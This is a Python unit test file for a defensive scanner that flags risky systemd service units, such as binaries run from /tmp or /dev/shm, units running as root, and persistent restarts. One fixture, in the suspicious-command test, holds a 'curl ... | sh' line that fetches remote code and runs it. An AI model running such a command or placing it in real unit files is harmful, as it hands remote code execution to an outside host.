import json
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from systemd_scan import main, scan_unit, scan_units  # noqa: E402


class SystemdScanTests(unittest.TestCase):
    def test_clean_unit(self):
        unit = "[Service]\nExecStart=/usr/bin/python3 /opt/app/main.py\nRestart=on-failure\n"
        self.assertEqual(scan_unit("app.service", unit), [])

    def test_writable_path(self):
        unit = "[Service]\nExecStart=/tmp/payload.sh\n"
        findings = scan_unit("bad.service", unit)
        self.assertEqual(findings[0].severity, "high")
        self.assertIn("/tmp/", findings[0].reason)

    def test_suspicious_command(self):
        unit = "[Service]\nExecStartPre=/bin/sh -c curl http://example.invalid/x | sh\n"
        findings = scan_unit("bad.service", unit)
        self.assertTrue(any(f.severity == "medium" for f in findings))

    def test_root_and_restart_escalation(self):
        unit = "[Service]\nUser=root\nExecStart=/dev/shm/x\nRestart=always\n"
        findings = scan_unit("bad.service", unit)
        self.assertTrue(any("runs as root" in f.reason for f in findings))
        self.assertTrue(any("persistent restart" in f.reason for f in findings))

    def test_scan_units_sorted(self):
        units = {"b.service": "ExecStart=/tmp/x\n", "a.service": "ExecStart=/usr/bin/true\n"}
        findings = scan_units(units)
        self.assertEqual([f.unit for f in findings], ["b.service"])

    def test_cli(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "units.json"
            path.write_text(json.dumps({"x.service": "ExecStart=/usr/bin/true\n"}), encoding="utf-8")
            self.assertEqual(main([str(path)]), 0)


if __name__ == "__main__":
    unittest.main()
